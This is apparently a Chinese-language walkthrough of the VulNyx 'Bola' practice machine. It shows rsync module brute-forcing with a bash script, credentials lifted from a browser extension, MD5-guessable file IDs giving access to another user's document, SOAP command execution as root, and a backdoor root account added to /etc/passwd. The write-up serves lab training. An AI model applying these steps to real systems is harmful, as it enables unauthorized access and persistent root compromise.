---
title: Vulnyx-Bola
published: 2025-03-09 16:18:04
tags: [Vulnyx]
category: 靶机
draft: false
---

# Bola

> Difficulty: **Medium**
> 

## 信息收集

`20`是靶机

```bash
┌──(root㉿kali)-[~/Desktop/test/Anon]
└─# nmap -sP 192.168.56.0/24                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:22 EST
Nmap scan report for 192.168.56.1
Host is up (0.00028s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00023s latency).
MAC Address: 08:00:27:42:FA:76 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.20
Host is up (0.00047s latency).
MAC Address: 08:00:27:D4:18:88 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds
```

```python
┌──(root㉿kali)-[~/Desktop/test/Anon]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:23 EST
Nmap scan report for 192.168.56.20
Host is up (0.00088s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
MAC Address: 08:00:27:D4:18:88 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds
```

```bash
┌──(root㉿kali)-[~/Desktop/test/Anon]
└─# nmap -sT -A -T4 -O -p 22,80,873 192.168.56.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:25 EST
Nmap scan report for 192.168.56.20
Host is up (0.00052s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp  open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://bola.nyx
873/tcp open  rsync   (protocol version 32)
MAC Address: 08:00:27:D4:18:88 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.56.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds
```

```bash
┌──(root㉿kali)-[~/Desktop/test/Anon]
└─# nmap -script=vuln -p 22,80,873 192.168.56.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:26 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.20
Host is up (0.00037s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
873/tcp open  rsync
MAC Address: 08:00:27:D4:18:88 (Oracle VirtualBox virtual NIC)
```

还没打过`873`端口，优先级`80` > `873` > `22` 

## web渗透

需要将`bola.nyx` 写入`hosts`文件，访问主页，没有任何信息

![image.png](image%207.png)

尝试了注册，但是貌似是假的

## rsync

> `rsync` 是一个常用的 `Linux` 应用程序，用于文件同步.它可以在本地计算机与远程计算机之间，或者两个本地目录之间同步文件（但不支持两台远程计算机之间的同步）。它也可以当作文件复制工具，替代`cp`和`mv`命令.它名称里面的`r`指的是 `remote`，`rsync` 其实就是"远程同步"（remote sync）的意思
> 

之前没遇到过这个服务，语法大概就是：

```bash
rsync -av rsync://<IP>/<路径>
```

假如访问了不存在的模块就会提示：

```bash
@ERROR: Unknown module 'src'
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.3.0]
```

加入成功连接那就会回显：

```bash
data      Data directory
backup    Backup files
```

那么就可以写一个脚本，来爆破目录了（脚本由`GPT`提供）

```bash
#!/bin/bash

# 字典文件路径
DICT_FILE="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

RSYNC_SERVER="192.168.56.20"

# 读取字典文件逐行爆破
while read -r dir; do
  echo "尝试模块: $dir"

  # 执行 rsync 测试
  result=$(rsync rsync://$RSYNC_SERVER/$dir 2>&1)

  # 检查是否包含错误或为空
  if [[ "$result" == *"error"* || -z "$result" ]]; then
    echo "[失败] 模块 '$dir' 不存在或无内容，跳过..."
  else
    echo "[成功] 找到有效模块: '$dir'"
    break
  fi

done < "$DICT_FILE"

```

经过爆破得到一个可用模块`extensions`

```bash
尝试模块: extensions
[成功] 找到有效模块: 'extensions'
```

访问一下，能看到存在一个`PDF`和压缩包，然后将两个文件都拉取下来

```bash
┌──(root㉿kali)-[~/Desktop/test/Bola]
└─# rsync -av rsync://192.168.56.20/extensions                   
receiving incremental file list
drwxr-xr-x          4,096 2025/02/05 11:43:23 .
-rw-r--r--         93,553 2025/02/05 10:42:57 Password_manager_FirefoxExtension-VulNyx.pdf
-rw-r--r--         30,811 2025/02/05 10:31:41 password_manager.zip

sent 20 bytes  received 137 bytes  314.00 bytes/sec
total size is 124,364  speedup is 792.13

```

```bash
┌──(root㉿kali)-[~/Desktop/test/Bola]
└─# rsync -av rsync://192.168.56.20/extensions/Password_manager_FirefoxExtension-VulNyx.pdf ./
receiving incremental file list
Password_manager_FirefoxExtension-VulNyx.pdf

sent 43 bytes  received 93,701 bytes  187,488.00 bytes/sec
total size is 93,553  speedup is 1.00
                                                                                  
┌──(root㉿kali)-[~/Desktop/test/Bola]
└─# rsync -av rsync://192.168.56.20/extensions/password_manager.zip ./
receiving incremental file list
password_manager.zip

sent 43 bytes  received 30,923 bytes  20,644.00 bytes/sec
total size is 30,811  speedup is 0.99

```

## 信息收集 - 后台

在获得文件压缩包中的`background.js`中存在一个邮箱和密码`jackie0x17@nyx.com` `sbIJ0x9g{C3``

```bash
┌──(root㉿kali)-[~/Desktop/test/Bola/manage]
└─# cat background.js                               
// Initialize default passwords on installation
browser.runtime.onInstalled.addListener(() => {
    const defaultPasswords = [
        { site: "bola.nyx", username: "jackie0x17@nyx.com", password: "sbIJ0x9g{C3`" }
    ];

    // Check if passwords already exist in storage
    browser.storage.local.get("passwords").then(result => {
        if (!result.passwords || result.passwords.length === 0) {
            browser.storage.local.set({ passwords: defaultPasswords }).then(() => {
                console.log("Default passwords initialized.");
            });
        }
    });
});
```

拿到邮箱和密码后成功登陆进后台

![image.png](image%208.png)

登陆进来就能看到存在一个`PDF`文件，再给它拉取下来，内容大概是介绍`WSDL`接口的，那么就存在`API`接口数据泄露的可能

首先就是下载`PDF`文件的这个接口，爆破了了一下无结果，再看了一下我们下载的文件名

`115a2cf084dd7e70a91187f799a7d5a8.pdf` 将`115a2cf084dd7e70a91187f799a7d5a8` 拿出来解开，发现是登陆的用户名（根据群友提示）

```bash
┌──(root㉿kali)-[~/Desktop/test/Bola]
└─# echo -n "jackie0x17" | md5sum
115a2cf084dd7e70a91187f799a7d5a8  -
```

那么现在的思路是寻找别的用户名，将其使用`MD5`加密，然后再下载文件

## 查找用户名

通过一段时间扫描可以找到`/.well-known/` 目录，并且还存在`security.txt` 和`openid-configuration`两个文件

```bash
┌──(root㉿kali)-[~]
└─# dirsearch -u http://bola.nyx/ -x 403 -e php,zip,txt -w Desktop/Dict/SecLists-2024.3/Discovery/Web-Content/dirsearch.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 21167

Output File: /root/reports/http_bola.nyx/__25-02-09_01-49-13.txt

Target: http://bola.nyx/

[01:49:13] Starting: 
[01:49:16] 200 -    1KB - /.well-known/openid-configuration                 
[01:49:16] 200 -  115B  - /.well-known/security.txt             
```

`security.txt` 

```bash
Contact: mailto:jackie0x17@nyx.com
Expires: 2025-08-20T10:12:00.000Z
Preferred-Languages: en, es
```

`openid-configuration`是`Json` 数据，发现了三个用户名：`d4t4s3c`和`jackie0x17`以及`ct014`

```bash
┌──(root㉿kali)-[~]
└─# curl http://bola.nyx/.well-known/openid-configuration                                                     
{                
    "issuer": "https:\/\/bola.nyx",
    "authorization_endpoint": "https:\/\/bola.nyx\/auth",
    "token_endpoint": "https:\/\/bola.nyx\/token",
    "userinfo_endpoint": "https:\/\/bola.nyx\/userinfo",
    "jwks_uri": "https:\/\/bola.nyx\/jwks.json",
    "response_types_supported": [
        "code",                 
        "token",                 
        "id_token"                                                            
    ],    
    "grant_types_supported": [
        "authorization_code",
        "implicit"          
    ],                              
    "subject_types_supported": [
        "public"
    ],                                 
    "id_token_signing_alg_values_supported": [
        "RS256"    
    ],
  "scopes_supported": [                                                     
        "openid",                                                             
        "profile",                                                            
        "email"                                                               
    ],                           
    "claims_supported": [              
        "sub",      
        "name",                        
        "email"    
    ],                                                                                                                                                       
    "userinfo": [
        {                          
            "sub": "d4t4s3c",                                                 
            "name": "d4t4s3c",                                                
            "email": "d4t4s3c@nyx.com"                                        
        },                                                                    
        {                        
            "sub": "jackie0x17",
            "name": "jackie0x17",
            "email": "jackie0x17@nyx.com"                                     
        },
        {                     
            "sub": "ct0l4",  
            "name": "ct0l4",
            "email": "ct0l4@nyx.com"
        }                       
    ]           
}                                      
```

## 文件下载

其中`d4t4s3c` 是靶机作者的名称，我们尝试使用他的用户名来突破

将其经过`base64`加密，然后进行文件下载，果然有内容

```bash
┌──(root㉿kali)-[~]
└─# echo -n "d4t4s3c" | md5sum
97035ded598faa2ce8ff63f7f9dd3b70  -
```

![image.png](image%209.png)

将会文件下载，内容大概是`WSDL Server VulNyx - How to Connect` ，在下面能找到哦一个用户名和密码：`admin` `VulNyxtestinglogin123` 

根据内容，`SOAP` 服务将在 `http://localhost:9000` 上启动，可以通过访问 `http://localhost:9000/?wsdl` 查看服务的 `WSDL` 文件，在外部构造访问无果。

## 靶机信息收集

得到的用户名密码，尝试了加上邮箱后缀后登录后台，失败。

使用用户名：`d4t4s3c` 密码：`VulNyxtestinglogin123` 登录`SSH`成功，没有`sudo`

```bash
┌──(root㉿kali)-[~]
└─# ssh d4t4s3c@192.168.56.20      
d4t4s3c@192.168.56.20's password: 
Linux bola 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb  6 09:33:51 2025 from 192.168.1.50
d4t4s3c@bola:~$ 
```

```bash
d4t4s3c@bola:~$ id
uid=1000(d4t4s3c) gid=1000(pijusmagnifikus) groups=1000(pijusmagnifikus),1003(d4t4s3c)
d4t4s3c@bola:~$ uname -a
Linux bola 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64 GNU/Linux
d4t4s3c@bola:~$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s17: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:d4:18:88 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.20/24 brd 192.168.56.255 scope global dynamic enp0s17
       valid_lft 496sec preferred_lft 496sec
    inet6 fe80::a00:27ff:fed4:1888/64 scope link 
       valid_lft forever preferred_lft forever
d4t4s3c@bola:~$ 
```

根据上面的的`PDF`的信息，查看一下当前系统运行的情况。和`PDF`上的一样运行在`9000`端口

```bash
d4t4s3c@bola:~$ ss -plntu
Netid          State           Recv-Q          Send-Q                     Local Address:Port                     Peer Address:Port          Process          
udp            UNCONN          0               0                                0.0.0.0:68                            0.0.0.0:*                              
tcp            LISTEN          0               5                                0.0.0.0:873                           0.0.0.0:*                              
tcp            LISTEN          0               5                              127.0.0.1:9000                          0.0.0.0:*                              
tcp            LISTEN          0               80                             127.0.0.1:3306                          0.0.0.0:*                              
tcp            LISTEN          0               128                              0.0.0.0:22                            0.0.0.0:*                              
tcp            LISTEN          0               5                                   [::]:873                              [::]:*                              
tcp            LISTEN          0               128                                 [::]:22                               [::]:*                              
tcp            LISTEN          0               511                                    *:80                                  *:*                              
```

## 提权

使用`socat`将端口转发到`1234`端口，让外网能通过`1234`端口访问

```bash
d4t4s3c@bola:~$ ./socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:9000 &
[1] 1219
d4t4s3c@bola:~$ ss -plntu
Netid       State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       Process                                
udp         UNCONN        0             0                          0.0.0.0:68                      0.0.0.0:*                                                 
tcp         LISTEN        0             5                          0.0.0.0:873                     0.0.0.0:*                                                 
tcp         LISTEN        0             5                        127.0.0.1:9000                    0.0.0.0:*                                                 
tcp         LISTEN        0             80                       127.0.0.1:3306                    0.0.0.0:*                                                 
tcp         LISTEN        0             5                          0.0.0.0:1234                    0.0.0.0:*           users:(("socat",pid=1219,fd=5))       
tcp         LISTEN        0             128                        0.0.0.0:22                      0.0.0.0:*                                                 
tcp         LISTEN        0             5                             [::]:873                        [::]:*                                                 
tcp         LISTEN        0             128                           [::]:22                         [::]:*                                                 
tcp         LISTEN        0             511                              *:80                            *:*       
```

![image.png](image%2010.png)

访问`bola.nyx:1234/wsdl` ，抓包，得到`wsdl`接口定义

```xml
<definitions name="VulNyxSOAP"
   targetNamespace="http://localhost/wsdl/VulNyxSOAP.wsdl"
   xmlns="http://schemas.xmlsoap.org/wsdl/"
   xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
   xmlns:tns="http://localhost/wsdl/VulNyxSOAP.wsdl"
   xmlns:xsd="http://www.w3.org/2001/XMLSchema">

   <message name="LoginRequest">
      <part name="username" element="username"/>
      <part name="password" element="password"/>
   </message>

   <message name="LoginResponse">
      <part name="status" type="string"/>
   </message>

   <message name="ExecuteCommandRequest">
      <part name="cmd" element="cmd"/>
   </message>

   <message name="ExecuteCommandResponse">
      <part name="output" element="cmd"/>
   </message>

   <portType name="VulNyxSOAPPortType">
      <operation name="Login">
         <input message="tns:LoginRequest"/>
         <output message="tns:LoginResponse"/>
      </operation>
      <operation name="ExecuteCommand">
         <input message="tns:ExecuteCommandRequest"/>
         <output message="tns:ExecuteCommandResponse"/>
      </operation>
   </portType>

   <binding name="VulNyxSOAPBinding" type="tns:VulNyxSOAPPortType">
      <soap:binding style="rpc"
         transport="http://schemas.xmlsoap.org/soap/http"/>
      <operation name="Login">
         <soap:operation soapAction="Login"/>
         <input>
            <soap:body use="literal"/>
         </input>
         <output>
            <soap:body use="literal"/>
         </output>
      </operation>
      <operation name="ExecuteCommand">
         <soap:operation soapAction="ExecuteCommand"/>
         <input>
            <soap:body use="literal"/>
         </input>
         <output>
            <soap:body use="literal"/>
         </output>
      </operation>
   </binding>

   <service name="VulNyxSOAP">
      <port binding="tns:VulNyxSOAPBinding" name="VulNyxSOAPPort">
         <soap:address location="http://localhost:9000/wsdl/" />
      </port>
   </service>
</definitions> 如何构造请求
```

看见`VulNyxSOAP.wsdl` ，构造链接`http://bola.nyx:1234/wsdl/VulNyxSOAP.wsdl` ，再抓包

丢到`WSDLer`中解析，能发现有`Login`和`ExecuteCommand`两种行为

![image.png](image%2011.png)

我们将`ExecuteCommand` 发送到重放器（`Repeater`）进行测试，在`cmd`处输入`id` ，成功执行，还是`root`权限

![image.png](image%2012.png)

## RootFlag & UserFlag

`userflag`其实在`ssh`上去的时候的就可以拿了

我们直接通过命令执行直接读取`RootFlag` & `UserFlag`

![image.png](image%2013.png)

## 获得shell的方法

这里使用添加用户的方法

添加用户`sunset`，密码`123456`

![image.png](image%2014.png)

查看是否成功，可以看到已经创建了

```xml
d4t4s3c@bola:~$ tail -n 1 /etc/passwd
sunset:zSZ7Whrr8hgwY:0:0:root:/root:/usr/bin/bash
```

切换到`sunset`用户即可获得`rootshell`

```xml
d4t4s3c@bola:~$ su sunset
Password: 
root@bola:/home/d4t4s3c# 
```